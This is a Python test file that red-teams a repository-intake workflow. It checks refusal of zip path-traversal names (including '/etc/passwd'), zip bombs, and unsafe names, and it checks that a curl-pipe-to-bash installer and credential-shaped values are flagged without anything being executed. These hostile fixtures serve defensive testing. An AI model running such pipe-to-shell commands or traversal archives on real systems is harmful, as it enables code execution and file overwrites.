"""RED TEAM (process workflow): hostile archives, stages that fail, and any way the report could claim 'complete' when it is not."""
import json
import pathlib
import unittest
import zipfile

from test_process import APP, LOADER, MIT, fixture, make_zip
from vega_dkg import process


def run(t, cfg, name=None, **kw):
    return process.process(str(t / "tiny-main.zip"), cfg, name, **kw)


class HostileArchives(unittest.TestCase):
    def test_member_names_that_walk_out_or_are_absolute_are_refused_before_anything_is_unpacked(self):
        for evil in ("../escape.txt", "a/../../escape.txt", "/etc/passwd", "C:/windows/x", "a\\..\\..\\x"):
            t, cfg = fixture()
            with zipfile.ZipFile(t / "tiny-main.zip", "a") as z:
                z.writestr(evil, "x")
            rep = run(t, cfg)
            self.assertFalse(rep["complete"], evil)
            self.assertEqual(rep["failed_at"], "intake", evil)
            self.assertFalse((t / "vet" / "tiny-main").exists(), evil)
            self.assertFalse((t.parent / "escape.txt").exists())

    def test_a_zip_bomb_is_refused(self):
        t, cfg = fixture()
        with zipfile.ZipFile(t / "tiny-main.zip", "w", zipfile.ZIP_DEFLATED) as z:
            z.writestr("tiny-main/zeros.bin", b"\0" * (120 * 1024 * 1024))
        rep = run(t, cfg)
        self.assertEqual((rep["complete"], rep["failed_at"]), (False, "intake"))
        self.assertIn("zip bomb", rep["stages"]["intake"]["error"])

    def test_not_a_zip_a_missing_file_too_many_members_and_unsafe_names_are_refused(self):
        t, cfg = fixture()
        (t / "tiny-main.zip").write_bytes(b"this is not a zip")
        self.assertEqual(run(t, cfg)["failed_at"], "intake")
        self.assertEqual(process.process(str(t / "nothing.zip"), cfg)["failed_at"], "intake")
        t2, cfg2 = fixture()
        old = process.MAX_MEMBERS
        process.MAX_MEMBERS = 2
        try:
            self.assertEqual(run(t2, cfg2)["failed_at"], "intake")
        finally:
            process.MAX_MEMBERS = old
        t3, cfg3 = fixture()
        for bad in ("../x", "a/b", "", "x" * 300):
            self.assertFalse(process.process(str(t3 / "tiny-main.zip"), cfg3, bad)["complete"], bad)

    def test_an_installer_that_pipes_a_download_into_a_shell_is_flagged(self):
        t, cfg = fixture(files={"LICENSE": MIT, "install.sh": "curl -fsSL https://example.org/x.sh | bash\n", "pkg/app.py": APP})
        rep = run(t, cfg)
        self.assertEqual(rep["stages"]["vet"]["installer_scripts"], ["install.sh"])
        self.assertEqual(rep["stages"]["vet"]["verdict"], "REVIEW_FLAGS")

    def test_credential_shaped_values_and_risky_calls_are_counted_and_nothing_is_executed(self):
        marker = pathlib.Path(fixture()[0]) / "owned.txt"
        evil = "import os\nos.system('echo x')\nopen(r'%s', 'w').write('owned')\nKEY = 'sk-' + 'a1B2c3D4' * 4\nSECRET = 'sk-" % marker + "a1B2c3D4" * 4 + "'\n"
        t, cfg = fixture(files={"LICENSE": MIT, "pkg/evil.py": evil, "conftest.py": "raise SystemExit(9)\n", "setup.py": "raise SystemExit(9)\n"})
        rep = run(t, cfg)
        self.assertEqual(rep["stages"]["vet"]["credential_shaped_file_count"], 1)
        self.assertGreaterEqual(rep["stages"]["vet"]["risky_call_total_in_production_code"], 1)
        self.assertFalse(marker.exists())
        self.assertTrue(rep["complete"], rep["stages"])                      # flags are reported, they do not pretend to be a safety verdict
        self.assertEqual(rep["stages"]["vet"]["verdict"], "REVIEW_FLAGS")
        self.assertNotIn("a1B2c3D4", json.dumps(rep))                        # the value itself never appears in a report

    def test_a_hostile_file_name_cannot_break_the_manifest_or_the_report(self):
        t, cfg = fixture(files={"LICENSE": MIT, "pkg/app.py": APP, "weird,name\nwith newline.py": "x = 1\n", "a b/c`d.py": "y = 2\n"})
        rep = run(t, cfg)
        self.assertTrue(rep["complete"], rep["stages"])
        self.assertEqual(len(rep["stages"]["extract"]["unextractable_members"]), 1)       # the name this OS refuses is listed, never read, and does not block the rest


class ReportsNeverOverclaim(unittest.TestCase):
    def test_a_graph_builder_that_fails_or_is_missing_stops_the_workflow_there(self):
        t, cfg = fixture()
        cfg.graphify = "this-command-does-not-exist"
        rep = run(t, cfg)
        self.assertEqual((rep["complete"], rep["failed_at"]), (False, "graph"))
        self.assertEqual([s for s in ("cards", "scores", "dkg_load") if rep["stages"][s].get("skipped")], ["cards", "scores", "dkg_load"])
        self.assertIn("INCOMPLETE", (t / "lib" / "tiny-main" / "PROCESS_REPORT.md").read_text(encoding="utf-8"))

    def test_a_repo_already_in_the_library_or_the_matrix_is_left_untouched(self):
        t, cfg = fixture()
        (t / "lib" / "tiny-main").mkdir()
        (t / "lib" / "tiny-main" / "mine.txt").write_text("keep me", encoding="utf-8")
        rep = run(t, cfg)
        self.assertEqual((rep["complete"], rep["failed_at"]), (False, "library"))
        self.assertEqual((t / "lib" / "tiny-main" / "mine.txt").read_text(encoding="utf-8"), "keep me")
        self.assertEqual((t / "matrix.json").read_text(encoding="utf-8"), "[]")
        t2, cfg2 = fixture()
        (t2 / "matrix.json").write_text(json.dumps([{"repo": "tiny-main", "license_class": "PERMISSIVE"}]), encoding="utf-8")
        self.assertEqual(run(t2, cfg2)["failed_at"], "library")

    def test_existing_matrix_rows_are_never_changed_and_a_backup_is_kept(self):
        t, cfg = fixture()
        before = [{"repo": "old", "license_class": "NO_LICENSE_FILE", "extra": [1, 2]}]
        (t / "matrix.json").write_text(json.dumps(before), encoding="utf-8")
        self.assertTrue(run(t, cfg)["complete"])
        after = json.loads((t / "matrix.json").read_text(encoding="utf-8"))
        self.assertEqual((after[0], len(after)), (before[0], 2))
        self.assertTrue(any(p.name.startswith("matrix.json.bak_") for p in t.iterdir()))

    def test_the_forced_class_is_used_but_the_vet_still_reports_what_it_found(self):
        t, cfg = fixture()
        rep = run(t, cfg, license_class="STRONG_COPYLEFT")
        self.assertEqual(json.loads((t / "matrix.json").read_text(encoding="utf-8"))[0]["license_class"], "STRONG_COPYLEFT")
        self.assertEqual(rep["stages"]["vet"]["license_class"], "PERMISSIVE")

    def test_a_loader_that_prints_nothing_useful_or_the_wrong_tag_is_not_trusted(self):
        for loader in ("print('ok')", "print('GNode[other]=5')", 'import sys\nprint("GNode[tiny-main]=0")'):
            t, cfg = fixture(loader=loader)
            rep = run(t, cfg)
            self.assertEqual((rep["complete"], rep["failed_at"]), (False, "dkg_load"), loader)

    def test_the_dag_record_says_which_stages_passed(self):
        t, cfg = fixture()
        rep = run(t, cfg)
        from vega_custody.dag.dag import Dag
        e = Dag([t / "dag" / "PROCESS_DAG.jsonl"], [t / "dag" / "PROCESS_DAG_LOC.jsonl"]).content.entries()[-1]
        self.assertTrue(all(e["payload"]["stages"][s] for s in process.STAGES if s not in ("dag", "report")))
        self.assertEqual(e["payload"]["archive_sha256"], rep["stages"]["intake"]["archive_sha256"])


if __name__ == "__main__":
    unittest.main()
